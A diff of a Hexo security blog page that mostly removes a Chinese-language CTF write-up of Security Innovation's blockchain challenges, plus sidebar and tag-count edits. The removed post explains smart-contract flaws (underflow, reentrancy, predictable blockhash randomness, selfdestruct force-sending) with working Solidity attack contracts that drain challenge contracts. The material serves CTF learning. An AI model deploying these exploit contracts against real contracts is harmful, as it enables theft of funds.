@@ -158,117 +158,6 @@
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2019-06-06T16:00:00.000Z">2019-06-07</time>
-                
-                <div class="level-item">
-                <a class="has-link-grey -link" href="/categories/security/">security</a>&nbsp;/&nbsp;<a class="has-link-grey -link" href="/categories/security/writeups/">writeups</a>
-                </div>
-                
-                
-                <span class="level-item has-text-grey">
-                    
-                    
-                    7 minutes read (About 1103 words)
-                </span>
-                
-                
-            </div>
-        </div>
-        
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
-            
-                <a class="has-link-black-ter" href="/2019/06/07/security/writeups/blockchain-ctf/">[Writeups] Security Innovation Blockchain CTF</a>
-            
-        </h1>
-        <div class="content">
-            <h2 id="Donation"><a class="header-anchor" href="#Donation"></a>Donation</h2>
-<p>這題是簽到題<br>
-就只是讓我們呼叫合約裡面的這個函式 <code>withdrawDonationsFromTheSuckersWhoFellForIt</code></p>
-<h2 id="Lock-Box"><a class="header-anchor" href="#Lock-Box"></a>Lock Box</h2>
-<p>這題有個 <code>private</code> 的 <code>pin</code> 變數，但是 <code>private</code> 只是代表那個變數沒有 <code>getter</code> 函式，把合約的狀態抓下來就看光光啦<br>
-使用 <a href="https://web3js.readthedocs.io/en/1.0/web3-eth.html#eth-getstorageat"><code>web3.eth.getStorageAt</code></a> 這個函式<br>
-父合約的變數會在子合約的變數的前面<br>
-所以 position 0 的位址是 <code>authorizedToPlay</code>，而 position 1 的位址就是 <code>pin</code><br>
-變數在 storage 裡面怎麼擺的可以參考這篇 <a href="https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/">Understanding Ethereum Smart Contract Storage</a></p>
-<h2 id="Piggy-Bank"><a class="header-anchor" href="#Piggy-Bank"></a>Piggy Bank</h2>
-<p>這題直接呼叫 <code>collectFunds</code> 就好了<br>
-只有 <code>PiggyBank</code> 的 <code>collectFunds</code> 有 <code>onlyOwner</code>，<code>CharliesPiggyBank</code> 的 <code>collectFunds</code> 沒有 <code>onlyOwner</code></p>
-<h2 id="SI-Token-Sale"><a class="header-anchor" href="#SI-Token-Sale"></a>SI Token Sale</h2>
-<p>這題的 <code>purchaseTokens</code> 沒有用 SafeMath，也沒有檢查 <code>_value</code> 要大於 <code>feeAmount</code><br>
-先轉個 <code>0.000001</code> 給合約，這樣 <code>0.000001 - 0.00001</code> 就會 underflow 變成很大的數字，就得到了超多的 token<br>
-然後再用 <code>refundTokens</code> 就可以半價把 token 換成 ether 錢錢了</p>
-<h2 id="Secure-Bank"><a class="header-anchor" href="#Secure-Bank"></a>Secure Bank</h2>
-<p><code>SecureBank</code> 的 <code>withdraw</code> 和 <code>MembersBank</code> 的 <code>withdraw</code> 其中的 <code>_value</code> 參數形態不一樣<br>
-他們會被看成是不一樣的函式，所以會有兩個不一樣的型態 <code>withdraw</code> 可以呼叫<br>
-而 <code>MembersBank</code> 的 <code>withdraw</code> 沒有檢查是不是本人，所以就直接把 contract creator 的錢領走</p>
-<h2 id="Lottery"><a class="header-anchor" href="#Lottery"></a>Lottery</h2>
-<p>這題要猜 <code>entropy^entropy2</code> 的值，猜到就可以拿走裡面的錢錢</p>
-<p><code>entropy = blockhash(block.number)</code>，但是我們沒辦法知道這個 block 的 blockhash，因為這個 block 還沒算完<br>
-但這樣寫不會有錯誤，只是出來的值會是 <code>0</code><br>
-既然 <code>entropy = 0</code> 那就只剩 <code>entropy2</code>，而 <code>entropy2</code> 是根據 <code>msg.sender</code> 來的<br>
-所以我們可以直接算出 <code>_seed</code> 的值<br>
-可以直接用 <a href="https://remix.ethereum.org">remix</a> 寫個簡單的 smart contract 幫我們算那個值，然後利用 <code>event</code> 來印出那個值 ( 當 print 用 )</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.9;</span><br><span class="line"></span><br><span class="line">contract test &#123;</span><br><span class="line">    event Log(bytes32 value);</span><br><span class="line">    </span><br><span class="line">    function go () public &#123;</span><br><span class="line">        emit Log(keccak256(abi.encodePacked(msg.sender)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>或是直接寫一個攻擊合約，去呼叫 <code>play</code> 函式<br>
-記得要先把這個合約加到 <code>authorizedToPlay</code>，如果是 gas 不夠就調高 gas limit 吧</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.9;</span><br><span class="line"></span><br><span class="line">import &quot;.&#x2F;challenge.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    function exploit(address payable _target) public payable &#123;</span><br><span class="line">        Lottery target &#x3D; Lottery(_target);</span><br><span class="line"></span><br><span class="line">        bytes32 entropy2 &#x3D; keccak256(abi.encodePacked(this));</span><br><span class="line">        uint256 seeds &#x3D; uint256(entropy2);</span><br><span class="line"></span><br><span class="line">        target.play.value(msg.value)(seeds);</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="Trust-Fund"><a class="header-anchor" href="#Trust-Fund"></a>Trust Fund</h2>
-<p>這題是經典的 reentrant attack</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.9;</span><br><span class="line"></span><br><span class="line">contract TrustFund &#123;</span><br><span class="line">    function withdraw() external &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    address target &#x3D; 0xd297ab1c9653295BdE4f6b2e32574Ac5DD994997;</span><br><span class="line">    uint count &#x3D; 10;</span><br><span class="line"></span><br><span class="line">    function () external payable &#123;</span><br><span class="line">        if (count &gt; 0) &#123;</span><br><span class="line">            count--;</span><br><span class="line">            TrustFund trust &#x3D; TrustFund(target);</span><br><span class="line">            trust.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exploit () public &#123;</span><br><span class="line">        TrustFund trust &#x3D; TrustFund(target);</span><br><span class="line">        trust.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function withdraw () public &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="Heads-or-Tails"><a class="header-anchor" href="#Heads-or-Tails"></a>Heads or Tails</h2>
-<p>這題跟 Lottery 很像，不過用的是上一個 block 的 blockhash<br>
-那就寫個攻擊合約去呼叫 <code>play</code>，就可以算出一樣的 <code>entropy</code><br>
-給 <code>0.1 ether</code> 能賺 <code>0.05 ether</code>，所以玩個 20 次就把錢全部撈出來啦<br>
-記得要寫 <code>fallback</code> 函式才能接錢進來呀 ( 我這裡卡超久der )</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.9;</span><br><span class="line"></span><br><span class="line">contract HeadsOrTails &#123;</span><br><span class="line">    function play(bool _heads) external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    address target &#x3D; 0xf8583ccB9900615e0b8304A16539EBFD96c2B0af;</span><br><span class="line"></span><br><span class="line">	function () external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function exploit () public payable &#123;</span><br><span class="line">        bytes32 entropy &#x3D; blockhash(block.number - 1);</span><br><span class="line">        bool coinFlip &#x3D; (entropy[0] &amp; &#39;\x01&#39;) &#x3D;&#x3D; &#39;\x01&#39;;</span><br><span class="line"></span><br><span class="line">        HeadsOrTails heads &#x3D; HeadsOrTails(target);</span><br><span class="line"></span><br><span class="line">		for (uint i &#x3D; 0; i &lt; 20; i++) &#123;</span><br><span class="line">			heads.play.value(0.1 ether)(coinFlip);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="Record-Label"><a class="header-anchor" href="#Record-Label"></a>Record Label</h2>
-<p>這題的題目很長，主要的邏輯就是你領錢的時候會被 <code>royalties</code> 抽成，<code>manager</code> 會抽成 80 趴的錢錢<br>
-所以如果直接呼叫 <code>withdrawFundsAndPayRoyalties</code> 就可以拿到 <code>0.2 ether</code>，<code>royalties</code> 抽走 <code>0.8 ether</code>，這題就解掉了 ( 題目合約 <code>balance = 0</code> )<br>
-不過正確的解法 ( 我全都要 ) 應該是找出 <code>_manager</code> 的地址，然後呼叫 <code>addRoyaltyReceiver</code> 把 <code>receiverToPercentOfProfit</code> 這個 mapping 中 <code>_manager</code> 的 percent 覆寫成 0<br>
-這樣去領錢就不會被抽成了</p>
-<h2 id="Slot-Machine"><a class="header-anchor" href="#Slot-Machine"></a>Slot Machine</h2>
-<p>這題的題目很短，就一個 <code>fallback</code> 函式<br>
-但是第一行限制一次只能匯款 <code>1 szabo</code> ( <code>0.000001 ether</code> )<br>
-目標是要讓這個合約的 balance 大於等於 <code>5 ether</code>，他就會把所有錢錢都給你<br>
-其中一個不透過 <code>fallback</code> 給錢的方法就是用 <code>selfdestruct</code><br>
-<code>selfdestruct</code> 就是把合約清除掉，在被清除掉之前，這個合約可以把他的錢錢匯款給一個帳戶，而這個匯款的動作不會經過 <code>fallback</code> 函式<br>
-寫一個攻擊合約，並給他 <code>5 ether</code>，讓他自我毀滅，並在毀滅之前把 <code>5 ether</code> 匯款給題目合約</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.9;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    function exploit () public payable &#123;</span><br><span class="line">        selfdestruct(address(0x22f616f6b95e23efa8FBBAE44BeeC05890E12A4E));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<hr>
-<ol>
-<li><a href="https://f3real.github.io/tag/ethereum.html">https://f3real.github.io/tag/ethereum.html</a></li>
-<li><a href="https://xz.aliyun.com/t/2759">https://xz.aliyun.com/t/2759</a></li>
-</ol>
-
-        </div>
-        
-        
-        <div class="level is-mobile readmore-button">
-            <div class="level-start">
-                <div class="level-item">
-                <a class="button is-size-7 is-light" href="/2019/06/07/security/writeups/blockchain-ctf/#more">Read More</a>
-                </div>
-            </div>
-        </div>
-        
-        
-    </div>
-</div>
-
-
-
-
-
-
-
-
-    
-<div class="card card-readmore">
-    
-    <div class="card-content article ">
-        
-        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
-            <div class="level-left">
                 <time class="level-item has-text-grey" datetime="2019-05-05T16:00:00.000Z">2019-05-06</time>
                 
                 <div class="level-item">
@@ -288,7 +177,7 @@
         
         <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
             
-                <a class="has-link-black-ter" href="/2019/05/06/security/writeups/opqrx/">[Writeups] TSG CTF 2019 - OPQRX</a>
+                <a class="has-link-black-ter" href="/2019/05/06/security/writeups/opqrx/">【Writeups】TSG CTF 2019 - OPQRX</a>
             
         </h1>
         <div class="content">
@@ -380,7 +269,7 @@ $$</p>
         
         <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
             
-                <a class="has-link-black-ter" href="/2019/04/26/security/writeups/p4fmt/">[Writeups] Teaser Confidence CTF Quals 2019 - p4fmt</a>
+                <a class="has-link-black-ter" href="/2019/04/26/security/writeups/p4fmt/">【Writeups】Teaser Confidence CTF Quals 2019 - p4fmt</a>
             
         </h1>
         <div class="content">
@@ -747,7 +636,7 @@ $$</p>
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
-                            8
+                            7
                         </p>
                     </a>
                 </div>
@@ -759,7 +648,7 @@ $$</p>
                     </p>
                     <a href="/tags">
                         <p class="title has-text-weight-normal">
-                            37
+                            39
                         </p>
                     </a>
                 </div>
@@ -825,17 +714,9 @@ $$</p>
                 <span class="level-item">security</span>
             </span>
             <span class="level-end">
-                <span class="level-item tag">14</span>
+                <span class="level-item tag">13</span>
             </span>
         </a><ul><li>
-        <a class="level is-marginless" href="/categories/security/crypto/">
-            <span class="level-start">
-                <span class="level-item">crypto</span>
-            </span>
-            <span class="level-end">
-                <span class="level-item tag">1</span>
-            </span>
-        </a></li><li>
         <a class="level is-marginless" href="/categories/security/news/">
             <span class="level-start">
                 <span class="level-item">news</span>
@@ -886,7 +767,7 @@ $$</p>
         <h3 class="menu-label">
             Tag Cloud
         </h3>
-        <a href="/tags/LINE-TAXI/" style="font-size: 10px;">LINE TAXI</a> <a href="/tags/adb/" style="font-size: 10px;">adb</a> <a href="/tags/algorithm/" style="font-size: 10px;">algorithm</a> <a href="/tags/android/" style="font-size: 13.33px;">android</a> <a href="/tags/blockchain/" style="font-size: 10px;">blockchain</a> <a href="/tags/burp/" style="font-size: 10px;">burp</a> <a href="/tags/crypto/" style="font-size: 11.67px;">crypto</a> <a href="/tags/ctf/" style="font-size: 18.33px;">ctf</a> <a href="/tags/drony/" style="font-size: 10px;">drony</a> <a href="/tags/frida/" style="font-size: 11.67px;">frida</a> <a href="/tags/gdb/" style="font-size: 10px;">gdb</a> <a href="/tags/hexo/" style="font-size: 13.33px;">hexo</a> <a href="/tags/icarus/" style="font-size: 13.33px;">icarus</a> <a href="/tags/iterm2/" style="font-size: 10px;">iterm2</a> <a href="/tags/kernel/" style="font-size: 10px;">kernel</a> <a href="/tags/knapsack/" style="font-size: 10px;">knapsack</a> <a href="/tags/lattice/" style="font-size: 10px;">lattice</a> <a href="/tags/netflix/" style="font-size: 10px;">netflix</a> <a href="/tags/news/" style="font-size: 10px;">news</a> <a href="/tags/nord/" style="font-size: 10px;">nord</a> <a href="/tags/nox/" style="font-size: 10px;">nox</a> <a href="/tags/osint/" style="font-size: 10px;">osint</a> <a href="/tags/powerlevel10k/" style="font-size: 10px;">powerlevel10k</a> <a href="/tags/powerlevel9k/" style="font-size: 10px;">powerlevel9k</a> <a href="/tags/pwn/" style="font-size: 15px;">pwn</a> <a href="/tags/pyc/" style="font-size: 10px;">pyc</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/reverse/" style="font-size: 15px;">reverse</a> <a href="/tags/rootkit/" style="font-size: 10px;">rootkit</a> <a href="/tags/rsa/" style="font-size: 10px;">rsa</a> <a href="/tags/security/" style="font-size: 20px;">security</a> <a href="/tags/seo/" style="font-size: 10px;">seo</a> <a href="/tags/srop/" style="font-size: 10px;">srop</a> <a href="/tags/subset-sum/" style="font-size: 10px;">subset-sum</a> <a href="/tags/writeups/" style="font-size: 16.67px;">writeups</a> <a href="/tags/zimfw/" style="font-size: 10px;">zimfw</a> <a href="/tags/zsh/" style="font-size: 10px;">zsh</a>
+        <a href="/tags/LINE-TAXI/" style="font-size: 10px;">LINE TAXI</a> <a href="/tags/adb/" style="font-size: 10px;">adb</a> <a href="/tags/algorithm/" style="font-size: 10px;">algorithm</a> <a href="/tags/android/" style="font-size: 13.33px;">android</a> <a href="/tags/blockchain/" style="font-size: 10px;">blockchain</a> <a href="/tags/burp/" style="font-size: 10px;">burp</a> <a href="/tags/command/" style="font-size: 10px;">command</a> <a href="/tags/crypto/" style="font-size: 10px;">crypto</a> <a href="/tags/ctf/" style="font-size: 18.33px;">ctf</a> <a href="/tags/drony/" style="font-size: 10px;">drony</a> <a href="/tags/frida/" style="font-size: 11.67px;">frida</a> <a href="/tags/gdb/" style="font-size: 10px;">gdb</a> <a href="/tags/hexo/" style="font-size: 13.33px;">hexo</a> <a href="/tags/icarus/" style="font-size: 13.33px;">icarus</a> <a href="/tags/iterm2/" style="font-size: 10px;">iterm2</a> <a href="/tags/kernel/" style="font-size: 10px;">kernel</a> <a href="/tags/netflix/" style="font-size: 10px;">netflix</a> <a href="/tags/news/" style="font-size: 10px;">news</a> <a href="/tags/nord/" style="font-size: 10px;">nord</a> <a href="/tags/nox/" style="font-size: 10px;">nox</a> <a href="/tags/osint/" style="font-size: 10px;">osint</a> <a href="/tags/powerlevel10k/" style="font-size: 10px;">powerlevel10k</a> <a href="/tags/powerlevel9k/" style="font-size: 10px;">powerlevel9k</a> <a href="/tags/proxy/" style="font-size: 10px;">proxy</a> <a href="/tags/pwn/" style="font-size: 15px;">pwn</a> <a href="/tags/pyc/" style="font-size: 10px;">pyc</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/reverse/" style="font-size: 15px;">reverse</a> <a href="/tags/reverse-ssh/" style="font-size: 10px;">reverse ssh</a> <a href="/tags/rootkit/" style="font-size: 10px;">rootkit</a> <a href="/tags/rsa/" style="font-size: 10px;">rsa</a> <a href="/tags/security/" style="font-size: 20px;">security</a> <a href="/tags/seo/" style="font-size: 10px;">seo</a> <a href="/tags/srop/" style="font-size: 10px;">srop</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/tunnel/" style="font-size: 10px;">tunnel</a> <a href="/tags/writeups/" style="font-size: 16.67px;">writeups</a> <a href="/tags/zimfw/" style="font-size: 10px;">zimfw</a> <a href="/tags/zsh/" style="font-size: 10px;">zsh</a>
     </div>
 </div>
     
@@ -914,7 +795,7 @@ $$</p>
             <div class="media-content">
                 <div class="content">
                     <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-07-30T16:29:25.000Z">2020-07-31</time></div>
-                    <a href="/2020/07/31/security/osint/maltego/" class="title has-link-black-ter is-size-6 has-text-weight-normal">[小工具] Maltego</a>
+                    <a href="/2020/07/31/security/osint/maltego/" class="title has-link-black-ter is-size-6 has-text-weight-normal">【小工具】Maltego</a>
                     <p class="is-size-7 is-uppercase">
                         <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/osint/">osint</a>
                     </p>
@@ -927,7 +808,7 @@ $$</p>
             <div class="media-content">
                 <div class="content">
                     <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-06-09T14:29:00.000Z">2020-06-09</time></div>
-                    <a href="/2020/06/09/security/writeups/ais3-2020-preexam/" class="title has-link-black-ter is-size-6 has-text-weight-normal">[Writeups] AIS3 pre-exam 2020</a>
+                    <a href="/2020/06/09/security/writeups/ais3-2020-preexam/" class="title has-link-black-ter is-size-6 has-text-weight-normal">【Writeups】AIS3 pre-exam 2020</a>
                     <p class="is-size-7 is-uppercase">
                         <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/writeups/">writeups</a>
                     </p>
@@ -940,7 +821,7 @@ $$</p>
             <div class="media-content">
                 <div class="content">
                     <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-05-04T06:33:13.000Z">2020-05-04</time></div>
-                    <a href="/2020/05/04/security/writeups/f-hash/" class="title has-link-black-ter is-size-6 has-text-weight-normal">[Writeups] VolgaCTF Quals 2020 - F-Hash</a>
+                    <a href="/2020/05/04/security/writeups/f-hash/" class="title has-link-black-ter is-size-6 has-text-weight-normal">【Writeups】VolgaCTF Quals 2020 - F-Hash</a>
                     <p class="is-size-7 is-uppercase">
                         <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/writeups/">writeups</a>
                     </p>
@@ -952,10 +833,10 @@ $$</p>
             
             <div class="media-content">
                 <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-20T13:11:11.000Z">2020-03-20</time></div>
-                    <a href="/2020/03/20/security/crypto/knapsack-crypto/" class="title has-link-black-ter is-size-6 has-text-weight-normal">[後量子密碼] Knapsack Cryptosystem and Subset-Sum Problem</a>
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-18T12:31:14.000Z">2020-03-18</time></div>
+                    <a href="/2020/03/18/security/reverse/android-proxy/" class="title has-link-black-ter is-size-6 has-text-weight-normal">【安卓逆向】透過 Burp Suite Proxy 夜神模擬器</a>
                     <p class="is-size-7 is-uppercase">
-                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/crypto/">crypto</a>
+                        <a class="has-link-grey -link" href="/categories/security/">security</a> / <a class="has-link-grey -link" href="/categories/security/reverse/">reverse</a>
                     </p>
                 </div>
             </div>
@@ -1022,7 +903,7 @@ $$</p>
                     <span class="level-item">March 2020</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">2</span>
+                    <span class="level-item tag">1</span>
                 </span>
             </a>
         </li>
@@ -1115,6 +996,17 @@ $$</p>
             </a>
         </li>
         
+        <li>
+            <a class="level is-marginless" href="/archives/2018/08/">
+                <span class="level-start">
+                    <span class="level-item">August 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
         </ul>
         </div>
     </div>
@@ -1141,7 +1033,7 @@ $$</p>
                 
                 </a>
                 <p class="is-size-7">
-                &copy; 2020 oalieno&nbsp;
+                &copy; 2021 oalieno&nbsp;
                 Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> & <a
                         href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a>
                 
